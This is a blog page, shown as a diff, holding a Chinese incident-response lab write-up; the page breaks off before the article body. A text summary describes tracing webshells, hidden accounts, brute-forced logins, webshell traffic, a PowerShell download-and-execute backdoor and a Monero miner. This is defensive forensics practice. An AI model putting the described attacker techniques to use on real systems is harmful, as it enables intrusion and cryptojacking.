@@ -1,0 +1,916 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>应急响应-知攻善防应急响应靶场 | At4ckxu の Blog</title><meta name="keywords" content="靶场"><meta name="author" content="At4ckxu"><meta name="copyright" content="At4ckxu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="应急响应-知攻善防应急响应靶场"><meta name="application-name" content="应急响应-知攻善防应急响应靶场"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="应急响应-知攻善防应急响应靶场"><meta property="og:url" content="https://attackxu.uno/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/index.html"><meta property="og:site_name" content="At4ckxu の Blog"><meta property="og:description" content="前置环境报错不兼容  开启靶机后关闭防火墙  Web1前景需要：小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：1.攻击者的shell密码2.攻击者的IP地址3.攻击者的隐藏账户名称4.攻击者挖矿程序的矿池域名用户：ad"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/060-zhigongshanfang-20260420-150300.png"><meta property="article:author" content="At4ckxu"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/060-zhigongshanfang-20260420-150300.png"><meta name="description" content="前置环境报错不兼容  开启靶机后关闭防火墙  Web1前景需要：小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：1.攻击者的shell密码2.攻击者的IP地址3.攻击者的隐藏账户名称4.攻击者挖矿程序的矿池域名用户：ad"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://attackxu.uno/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d9a737cd28cc672c3eacc008e36d30d4";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: {"enable":true,"ck":"3MU8EP30GUKlq023","LingQueMonitorID":"3MU8EP30GUKlq023"},
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: {"appId":"1IEKIL4B0X","apiKey":"1f8242201acd840333d33f678ccdd143","indexName":"hexo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    simplehomepage: false,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: At4ckxu","link":"链接: ","source":"来源: At4ckxu の Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'At4ckxu の Blog',
+  title: '应急响应-知攻善防应急响应靶场',
+  postAI: '',
+  pageFillDescription: '前置环境, Web1, 攻击者的shell密码, 攻击者的IP地址, 攻击者的隐藏账户名称, 攻击者挖矿程序的矿池域名, Web2, 攻击者的IP地址（两个）, 攻击者的webshell文件名, 攻击者的webshell密码, 攻击者的QQ号, 攻击者的服务器伪IP地址, 攻击者是如何入侵的（选择题）, Web3, 攻击者的两个IP地址, 攻击者隐藏用户名称, 三个攻击者留下的flag, linux1, 账户, 端口x2F进程x2F网络连接, 历史命令, 查看修改的该文件, 定时任务, 日志, 查看文件, Linux2, 数据包, 账户, 历史命令, 查看服务, 宝塔面板, 日志, 数据库, 文件, 近源OS, 攻击者的外网IP地址, 攻击者的内网跳板IP地址, 攻击者使用的限速软件的md5大写, 攻击者的后门md5大写, 攻击者留下的flag, 挖矿事件, 1. 命令分解, 2. 关键发现前置环境报错不兼容开启靶机后关闭防火墙前景需要小李在值守的过程中发现有占用飙升出于胆子小就立刻将服务器关机这是他的服务器系统请你找出以下内容并作为通关条件攻击者的密码攻击者的地址攻击者的隐藏账户名称攻击者挖矿程序的矿池域名用户密码攻击者的密码在网站根目录上传盾扫描攻击者的地址找到文件之后用户上传了该文件分析日志日志文件目录搜索文件存在大量访问的日志并且为攻击者的隐藏账户名称隐藏账户查看注册表默认无法查看其中内容右键菜单选择权限打开权限管理窗口权限勾选为完全控制关闭再次打开注册表或者攻击者挖矿程序的矿池域名当前为用户直接修改隐藏用户的密码找到反编译应急响应蓝队应急响应工具箱逆向工具在线网站转得到源码攻击者的地址两个攻击者的文件名攻击者的密码攻击者的号攻击者的服务器伪地址攻击者的服务器端口攻击者是如何入侵的选择题攻击者的隐藏用户名用户密码攻击者的地址两个盾扫描目录下存在后门文件查看日志存在访问后门的地址找到第一个使用系统日志分析工具在远程桌面登录成功日志查看到用户曾登录过为为第二个攻击攻击者的文件名攻击者的密码哥斯拉马攻击者的号在查看文档目录时发现存在文件夹攻击者在此登录过留下的痕迹攻击者登录过的号攻击者的服务器伪地址查看文件传输的内容发现隧道搭建工具查看配置文件发现攻击者攻击者是如何入侵的选择题已经得知攻击者留有后门我们需要知道攻击者如何上传该文件的在日志文件中是第一次就为再次之前没有看到上传因此非攻击查看配置文件没有找到日志相关配置文件错误日志路径通用查询日志需启用慢查询日志需启用并没有配置日志由于是靶场排除在实际攻击环境中需要考虑是否为攻击者修改配置文件删除日志查看日志确定为攻击攻击者时上传的该文件而是在排除用户密码前景需要小苕在省护值守中在灵机一动情况下把设备停掉了甲方问为什么要停设备小苕说我第六感告诉我这机器可能被黑了这是他的服务器请你找出以下内容作为通关条件攻击者的两个地址攻击者隐藏用户名称三个攻击者留下的攻击者的两个地址盾扫描发现存在两个后门文件都是一句话木马查看日志得到隐藏用户登录攻击者隐藏用户名称运行三个攻击者留下的日志分析时第一次访问此时响应第二次访问此时已经存在在其中我们发现请求疑似攻击者进行了模版注入虽然响应为但大概率通过这种方式已经成功写文件了查看计划任务发现修改用户的密码密码切换登录到该用户发现该用户的下载处存在文件文件内容为写入一句话木马到中并且获取到继续分析日志时推测攻击者进入了后台为使用密码找回工具发现存在两个用户将用户密码重置并登录发现相关账户密码前景需要小王急匆匆地找到小张小王说李哥我服务器被黑了快救救我服务器作用分类具体作用典型场景与其他环境如生产环境的差异代码开发提供运行环境供开发人员编写调试代码支持实时修改与测试本地代码运行测试调试接口或服务逻辑允许频繁重启或中断操作生产环境需高稳定性功能测试验证新功能或模块的可用性确保代码逻辑正确新功能联调数据库迁移测试使用模拟数据生产环境处理真实用户数据安全测试模拟攻击行为如渗透测试或验证安全补丁避免漏洞影响生产环境漏洞扫描权限配置验证安全策略可能放宽但需隔离生产网络协作与版本控制支持多开发者协作开发集成版本控制工具如管理代码分支与合并团队协同开发代码冲突解决允许实验性代码提交生产环境仅部署稳定版本工具链集成集成开发工具自动化测试框架如依赖管理如等自动化构建部署单元测试集成测试运行工具链灵活性高生产环境需最小化工具依赖数据模拟使用生成或脱敏的测试数据避免生产数据泄露或污染数据库压力测试用户行为模拟数据无真实业务价值生产数据需严格保护环境隔离独立于生产网络防止开发中的错误或攻击影响线上服务开发环境与生产环境分离微服务独立调试网络策略宽松生产环境需严格防火墙规则账户避免权限不足使用查看是否存在异常账户查看特权账户查看远程登录用户查看空口令账户无异常情况端口进程网络连接无异常情况历史命令一般是先备份再查看普通用户的历史命令未发现信息用户历史命令中发现信息发现并且这里在历史命令中发现他修改了开机自启动查看修改的该文件得到定时任务无异常日志未发现等发现进入查看日志查看连接成功的信息即为攻击者攻击查看文件被连接了可能相关文件被更改了查看配置文件前景需要看监控的时候发现告警领导让你上机检查你可以救救安服仔吗提交攻击者修改的管理员密码明文提交第一次的连接只需要提交提交连接密码提交数据包的提交攻击者使用的后续上传的木马文件名称提交攻击者隐藏的提交攻击者隐藏的相关账户密码无图形化界面远程连接冰蝎数据包当前用户目录下存在数据包下载到本地分析提示文件损坏无法打开尝试修复没修复成功账户无异常历史命令下载了宝塔可以看到历史命令中修改了文件查看文件得到找到查看服务由于下载了宝塔查看服务是否开启宝塔服务开启了宝塔此外还开启了宝塔面板修改宝塔密码查看宝塔端口信息登录宝塔宝塔中存在一个网站添加域名为当前访问日志分析日志涉及的有源文件在中最后确定可以在流量包里推测出攻击为流量包里全都是向的请求包大多数都没有成功数据库要知道攻击者修改的管理员密码前面知道网站开了可以连进数据库查看密码连接密码为文件搜索网站目录下网站目录为搜索可疑文件定位到了两个文件和这里分析数据包追踪流即可知道的请求与密码信息登录后台可以看到写入了也就是对应前台的注册协议的密码在文件内容也可以看到为靶机中有流量包进行追踪流分析在数据流之前的都是与注册协议交互根据流量特征分析使用的工具为蚁剑可以解码查看这里的请求之后的都是冰蝎流量特征了也能看出请求的名称近源相关账户密码前景需要小王从某安全大厂被优化掉后来到了某私立小学当起了计算机老师某一天上课的时候发现鼠标在自己动弹又发现除了某台电脑其他电脑连不上网络感觉肯定有学生捣乱于是开启了应急近源渗透或是一种网络安全攻击或测试手段其核心特点是攻击者或渗透测试人员通过物理接近目标结合技术手段与物理接触突破目标的安全防线与传统远程网络渗透不同近源渗透更依赖对目标物理环境周边设备或人员的直接接触或近距离交互攻击者的外网地址攻击者的内网跳板地址攻击者使用的限速软件的大写攻击者的后门大写攻击者留下的攻击者的外网地址桌面存在多个文件将文件放入沙箱查看宏并且网络行为中向境外发起了请求猜测该为攻击者攻击者的内网跳板地址在桌面的修复的文件尝试编辑会发现参数组件全称解释作用示例细节命令行工具启动环境基础执行程序不加载用户配置文件加快启动避免用户脚本干扰跳过配置隐藏窗口避免用户察觉可选值指定要执行的命令字符串后接需执行的代码别名执行字符串中的代码动态解析并运行常用于执行远程脚本或动态生成的代码创建对象提供客户端功能用于网络请求替代方案从指定下载字符串内容获取远程服务器上的数据此处为脚本代码目标为可能为内网攻击载荷完整命令意图隐藏窗口启动跳过配置文件下载并执行远程脚本典型渗透测试或恶意软件行为用于隐蔽执行未经授权的代码实际用途可能是植入后门横向移动信息窃取等内网为攻击者使用的限速软件的大写查看该文件属性创建时间和访问时间为同一天查找创建的文件输出到文件直接输出中文会乱码先设置控制台编码再查找输出以通用格式显示文件的创建时间按照创建时间降序排列递归地搜索所有子目录关注在创建宏文档之后创建的也就是后创建的通过百度搜索可限制带宽可疑文件查看目录也可以发现目录存在该文件提取小写转大写使用即可攻击者的后门大写检查启动项计划任务服务未发现异常排查后门时连续点击键次发现攻击者留的后门应用为找到该应用提取攻击者留下的也在后门中挖矿事件前景需要机房运维小陈下班后发现还有工作没完成然后上机器越用越卡请你帮他看看原因相关账户密码攻击者的地址攻击者开始攻击的时间攻击者攻击的端口挖矿程序的后门脚本的矿池的钱包的攻击者入侵流程挖矿事件第一步分析异常进程和发现存在一个占用异常高是一款开源的加密货币挖矿软件主要用于挖掘一种专注于隐私的数字货币它支持和挖掘算法这些算法针对和性能进行了优化由于其高效和可配置性而被广泛使用但它也因嵌入恶意软件和用于非法加密劫持活动的脚本而臭名昭著攻击者通常将部署在已被入侵的机器上以秘密挖掘利用其匿名交易特性隐藏踪迹确定为挖矿程序计算工具可以直接查看路径以及既然已经传挖矿程序了那就是已经拿到了分析系统日志先是登录失败后来是登录成功攻击者为并且可以看到从开始有登录失败的日志说明攻击者开始攻击时间为攻击者刚开始登录失败登录类型为是通过网络连接登录登录成功此时登录类型仍为也是通过网络连接登录查看登录发现攻击者在以及之后通过登录默认端口为攻击者攻击端口为火绒剑分析启动项存在文件使用也可以查看该文件分析命令分解创建对象用于下载文件在临时目录创建临时文件扩展名为最终文件类似从指定下载文件到临时文件执行下载的文件并传递一个参数疑似钱包地址执行后删除文件清理痕迹关键发现钱包地址这是门罗币的钱包地址是一个知名的加密货币矿池下载的文件来自文件名明确表明是矿工安装程序该为攻击者留下的后门文件内容为启动时执行该进而下载并执行一个挖矿木马安装脚本计算的哈希命令成功完成矿池是指一种由多个矿工矿机组成的集体通过共享算力共同挖掘加密货币如比特币门罗币等然后按照各自贡献的算力分配奖励的方式矿池的运作流程你连接到矿池服务器比如矿池给你分配任务一个区块的子任务你用自己的进行计算挖矿计算结果上传回矿池矿池中有人挖中一个区块所有人按贡献分红收益打到你提供的钱包地址则矿池地址为钱包地址为攻击者的攻击流程由于并没有开启服务等其他服务并且存在大量登录失败的信息推测攻击者应该为暴力破解进入主机进入主机之后留下后门并添加启动项从而在受害者主机挖矿',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-04-20 15:03:00',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/hexo/%E5%A4%B4%E5%83%8F.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">At4ckxu の Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/API%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">API安全<sup>2</sup></a><a href="/tags/CRLF/" style="font-size: 1.05rem;">CRLF<sup>1</sup></a><a href="/tags/CSRF/" style="font-size: 1.05rem;">CSRF<sup>1</sup></a><a href="/tags/HTTP/" style="font-size: 1.05rem;">HTTP<sup>9</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>8</sup></a><a href="/tags/JavaScript/" style="font-size: 1.05rem;">JavaScript<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>6</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 1.05rem;">SSRF<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 1.05rem;">XSS<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 1.05rem;">XXE<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">sql注入<sup>4</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" style="font-size: 1.05rem;">内存取证<sup>3</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.05rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/" style="font-size: 1.05rem;">日常生活<sup>2</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 1.05rem;">环境搭建<sup>7</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>14</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/04/"><span class="card-archive-list-date">四月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/10/"><span class="card-archive-list-date">十月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/08/"><span class="card-archive-list-date">八月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">七月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">41</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url">应急响应</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>靶场</span></a></span></div></div><h1 class="post-title" itemprop="name headline">应急响应-知攻善防应急响应靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2026-04-20T06:53:37.000Z" title="发表于 2026-04-20 14:53:37">2026-04-20</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-04-20T07:03:00.884Z" title="更新于 2026-04-20 15:03:00">2026-04-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont 